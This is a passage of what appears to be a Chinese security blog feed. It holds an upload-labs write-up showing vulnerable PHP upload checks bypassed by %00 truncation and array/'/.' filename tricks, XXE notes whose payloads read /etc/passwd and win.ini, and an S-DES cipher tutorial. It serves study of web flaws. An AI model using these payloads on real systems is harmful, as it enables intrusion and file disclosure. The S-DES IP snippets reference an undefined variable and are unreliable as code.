class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"/file.php\x00.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这本应该创建一个名为file.php\x00.jpg的文件，但实际上创建的文件是file.php。<br>源码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"php5"</span><span class="token punctuation">,</span><span class="token string">"php4"</span><span class="token punctuation">,</span><span class="token string">"php3"</span><span class="token punctuation">,</span><span class="token string">"php2"</span><span class="token punctuation">,</span><span class="token string">"html"</span><span class="token punctuation">,</span><span class="token string">"htm"</span><span class="token punctuation">,</span><span class="token string">"phtml"</span><span class="token punctuation">,</span><span class="token string">"pht"</span><span class="token punctuation">,</span><span class="token string">"jsp"</span><span class="token punctuation">,</span><span class="token string">"jspa"</span><span class="token punctuation">,</span><span class="token string">"jspx"</span><span class="token punctuation">,</span><span class="token string">"jsw"</span><span class="token punctuation">,</span><span class="token string">"jsv"</span><span class="token punctuation">,</span><span class="token string">"jspf"</span><span class="token punctuation">,</span><span class="token string">"jtml"</span><span class="token punctuation">,</span><span class="token string">"asp"</span><span class="token punctuation">,</span><span class="token string">"aspx"</span><span class="token punctuation">,</span><span class="token string">"asa"</span><span class="token punctuation">,</span><span class="token string">"asax"</span><span class="token punctuation">,</span><span class="token string">"ascx"</span><span class="token punctuation">,</span><span class="token string">"ashx"</span><span class="token punctuation">,</span><span class="token string">"asmx"</span><span class="token punctuation">,</span><span class="token string">"cer"</span><span class="token punctuation">,</span><span class="token string">"swf"</span><span class="token punctuation">,</span><span class="token string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'禁止保存为该类型文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>本题主要是没过滤文件名<br>所以在文件名上%00截断<br><img src="17.png" alt=""><br>ORZ没跑出来<br><code>.phP</code>，居然绕过了，哭唧唧</p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>太难了，好难看<br>源码</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//检查MIME</span>    <span class="token variable">$allow_type</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string">'image/png'</span><span class="token punctuation">,</span><span class="token string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$allow_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"禁止上传该类型文件!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//检查文件名</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'save_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$allow_suffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$allow_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"文件上传成功！"</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"文件上传失败！"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"请选择要上传的文件！"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>过程</p><pre><code>最终的文件名后缀取的是$file[count($file) - 1]，因此我们可以让$file为数组。$file[0]为smi1e.php/，也就是reset($file)，然后再令$file[2]为白名单中的jpg。此时end($file)等于jpg，$file[count($file) - 1]为空。而 $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];，也就是Haha.php/.，最终move_uploaded_file会忽略掉/.，最终上传Haha.php。</code></pre><p>解题思路：（数组 + /. 绕过）<br><img src="18.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE笔记</title>
      <link href="/2019/09/01/xxe-bi-ji/"/>
      <url>/2019/09/01/xxe-bi-ji/</url>
      
        <content type="html"><![CDATA[<h3 id="XML的小知识"><a href="#XML的小知识" class="headerlink" title="XML的小知识"></a>XML的小知识</h3><p><img src="1.png" alt=""></p><h4 id="1，元素"><a href="#1，元素" class="headerlink" title="1，元素"></a>1，元素</h4><p>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>实例:</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>body text in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>some message in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre><a id="more"></a><p>空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p><h4 id="2，属性"><a href="#2，属性" class="headerlink" title="2，属性"></a>2，属性</h4><p>属性可提供有关元素的额外信息<br>实例：</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>computer.gif<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><h4 id="3，实体"><a href="#3，实体" class="headerlink" title="3，实体"></a>3，实体</h4><p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p><h4 id="4，PCDATA"><a href="#4，PCDATA" class="headerlink" title="4，PCDATA"></a>4，PCDATA</h4><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p><h4 id="5，CDATA"><a href="#5，CDATA" class="headerlink" title="5，CDATA"></a>5，CDATA</h4><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p><h4 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h4><p>DTD实体<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:<!ENTITY 实体名 "实体内容“><br>引用实体的方式：&amp;实体名；<br>2，参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY % 实体名 "实体内容“><br>引用实体的方式：%实体名；</p><h3 id="payLoad"><a href="#payLoad" class="headerlink" title="payLoad"></a>payLoad</h3><p>payload1:</p><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY ></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">xxe</span> <span class="token attr-name">"Thinking"</span><span class="token punctuation">></span></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre><p>payload2:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE note[&lt;!ENTITY xxe SYSTEM "http://127.0.0.1/bWAPP/robots.txt"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>login</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>login</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>secret</span><span class="token punctuation">></span></span>Any bugs?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>secret</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reset</span><span class="token punctuation">></span></span></code></pre><p>payload3 Linux:</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE a [      &lt;!ENTITY b SYSTEM "file:///etc/passwd"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>aaa</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>aaa</span><span class="token punctuation">></span></span></code></pre><p>payload4 windows:</p><pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY ></span>&lt;!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S-DES详解</title>
      <link href="/2019/08/16/s-des-xiang-jie/"/>
      <url>/2019/08/16/s-des-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="一、S-DES介绍"><a href="#一、S-DES介绍" class="headerlink" title="一、S-DES介绍"></a>一、S-DES介绍</h3><p>S-DES是DES算法的简化版,并没有什么实际使用的价值,只用于教学来理解DES算法的加密方法,那么可能就有小朋友会问了，为什么不是直接讲DES呢,Orz对于非信安的萌新来说,DES确实难,所以先看一下简洁版的S-DES的算法先预热预热。</p><h3 id="二、整体加密流程"><a href="#二、整体加密流程" class="headerlink" title="二、整体加密流程"></a>二、整体加密流程</h3><a id="more"></a><p><img src="1.png" alt=""><br>看起来很可怕，其实就是三个部分，一个是左边的加密算法，一个中间的密钥生成算法，一个右边的解密算法<br>按常理，先罗列一下所需要的前提条件</p><h4 id="1-gt-数学知识储备"><a href="#1-gt-数学知识储备" class="headerlink" title="1 &gt;数学知识储备"></a>1 &gt;数学知识储备</h4><h5 id="1-置换"><a href="#1-置换" class="headerlink" title="1.置换"></a>1.置换</h5><p>离散上有的，切确来说就是，比如<code>p8{8,2,6,4,1,7,5,3}</code>,就是转换下标顺序，比如输入<code>ABCDEFGH</code>,经过p8,得到的<code>HBFDAGEC</code></p><h5 id="2-循环"><a href="#2-循环" class="headerlink" title="2.循环"></a>2.循环</h5><p>比较好理解，就是左移右移，溢出的位循环补齐，比如<code>ABCD</code>,左移一位就是<code>BCDA</code></p><h5 id="3-如何选S盒中的值"><a href="#3-如何选S盒中的值" class="headerlink" title="3.如何选S盒中的值"></a>3.如何选S盒中的值</h5><p>S盒就相当于一个二位数组，作用是输入一个4 bit的二进制流，输出一个2bit的二进制流<br>规则：当输入<code>ABCD</code>,则选择（AD，BC)为坐标，比如下方的S盒</p><pre><code>S0:{1,0,3,2},{3,2,1,0},{0,2,1,3},{3,1,3,2},</code></pre><p>当输入0101时候，(AD,BC)= （01,10）=（1，2）=1=01 所以输出01，数组横纵坐标都是0~3</p><h4 id="2-gt-一些变量"><a href="#2-gt-一些变量" class="headerlink" title="2&gt;一些变量"></a>2&gt;一些变量</h4><pre><code>P10 {3,5,2,7,4,10,1,9,8,6}P8 {6,3,7,4,8,5,10,9} 注意这个置换选择输入10位输出8位P4 {2,4,3,1}IP {2,6,3,1,4,8,5,7}IPI {4,1,3,5,7,2,8,6}EP {4,1,2,3,2,3,4,1} 注意这个是扩展置换,输入4位输出8位两个盒子S0:{1,0,3,2},{3,2,1,0},{0,2,1,3},{3,1,3,2},S1:{0,1,2,3},{2,0,1,3},{3,0,1,0},{2,1,0,3},</code></pre><h4 id="3-gt-简单的实现"><a href="#3-gt-简单的实现" class="headerlink" title="3&gt;简单的实现"></a>3&gt;简单的实现</h4><p>None的作用是占据下标为0的数组值</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">P10</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    k <span class="token operator">=</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span> <span class="token operator">+</span> key    <span class="token keyword">return</span> <span class="token punctuation">[</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">P8</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    k <span class="token operator">=</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span> <span class="token operator">+</span> key    <span class="token keyword">return</span> <span class="token punctuation">[</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">Shift</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span></code></pre><h3 id="三、密钥生成"><a href="#三、密钥生成" class="headerlink" title="三、密钥生成"></a>三、密钥生成</h3><p>单独把密钥生成拿出来考虑的话，其实就是输入一个10bit的二进制，得到一个8bit的K1,一个8Bit的K2<br><img src="2.png" alt=""><br>假设我们的10位密钥 key=01111 11101</p><ul><li>1、p10置换得到11111 10011 ,(p10表在上面有</li><li>2、记左半的为LK=11111,右半为RK=10011</li><li>3、LK,RK循环左移一位，得到LK=11111,RK=00111</li><li>4、LK,RK重组为11111 00111 做p8置换，得到<code>K1=0101 1111</code></li><li>5、抛弃第四条，把LK,RK再次循环左移两位得到LK=11111,RK=11100</li><li>6、LK,PK重组得到11111 11100,做p8置换得到<code>K2=1111 1100</code></li></ul><p>到此位置密钥生成的算法我们就了解了</p><h3 id="四、加密流程"><a href="#四、加密流程" class="headerlink" title="四、加密流程"></a>四、加密流程</h3><p><img src="3.png" alt=""></p><h4 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h4><h5 id="1-IP与IP-1"><a href="#1-IP与IP-1" class="headerlink" title="1.IP与IP-1"></a>1.IP与IP-1</h5><p>其实IP就是一个8bit到8bit的置换，IP-1是他的逆，（离散真香<br>实现就是</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">IP</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    v <span class="token operator">=</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span> <span class="token operator">+</span> value    <span class="token keyword">return</span> <span class="token punctuation">[</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">IPinv</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    v <span class="token operator">=</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span> <span class="token operator">+</span> value    <span class="token keyword">return</span> <span class="token punctuation">[</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><h5 id="2-SW函数"><a href="#2-SW函数" class="headerlink" title="2.SW函数"></a>2.SW函数</h5><p>在大图中有一个SW的函数，在小图中因为更详细就没有，其实意思就是高四位和第四位互换</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">SW</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> value<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> value<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span></code></pre><h5 id="3-剩下最后一个F函数"><a href="#3-剩下最后一个F函数" class="headerlink" title="3.剩下最后一个F函数"></a>3.剩下最后一个F函数</h5><p>到目前为止，只剩下一个问题，就是F函数(大图的Fk函数)，我们先看F函数的功能参数和返回值<br><code>参数：一个8bit的子密钥K1,一个4Bit的L0,一个4Bit的R0</code><br><code>返回值：4bit的新R1</code><br>假如K1为<code>0101 1111</code>,左半(高位)为L0=<code>0100</code>,右半(低位)为R0=<code>1001</code></p><ul><li>1.对R0做EP扩展<code>（4,1,2,3,2,3,4,1）</code>置换,得Rm’=<code>1100 0011</code></li><li>2.Rm’与子密钥K1按位异或,得Rm’= <code>1001 1100</code></li><li>3.Rm’左半1001进入S0盒替代选择得S0(11,00)=S0(3,1)=11,右半1100进入S1盒替代选择的S1(10,10)=S1(2,2)=01,所以的到了Rm’=<code>1101</code></li><li>4.对Rm’做P4（2,4,3,1）置换,得Rm’=1101</li><li>5.Rm’与L0按位异或,得L0’=1001</li><li>6.L0’与最开始的R0组合得到<code>1001(L0’) 1001(R0)</code></li><li>7.然后交换高低位,1001(R0) 1001(L0’)作为输入第二轮的输入即：L1=1001，R1=1001</li></ul><p>到此第一轮循环完全结束，第二次也类似，第二轮结束的组合通过IP-1就算加密结束</p><h3 id="五、简单的S-DES加密python实现"><a href="#五、简单的S-DES加密python实现" class="headerlink" title="五、简单的S-DES加密python实现"></a>五、简单的S-DES加密python实现</h3><p><img src="4.png" alt=""></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> stringplaintext <span class="token operator">=</span> <span class="token string">"11101010"</span>K <span class="token operator">=</span> <span class="token string">"0111111101"</span>rounds <span class="token operator">=</span> <span class="token number">2</span>alphabet <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token keyword">def</span> <span class="token function">bin_to_ascii_4bit</span><span class="token punctuation">(</span>bin_string<span class="token punctuation">)</span><span class="token punctuation">:</span>    h1<span class="token punctuation">,</span> h2 <span class="token operator">=</span> split_half<span class="token punctuation">(</span>bin_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> alphabet<span class="token punctuation">[</span>bin_to_int<span class="token punctuation">(</span>h1<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> alphabet<span class="token punctuation">[</span>bin_to_int<span class="token punctuation">(</span>h2<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">P10</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">4</span><span 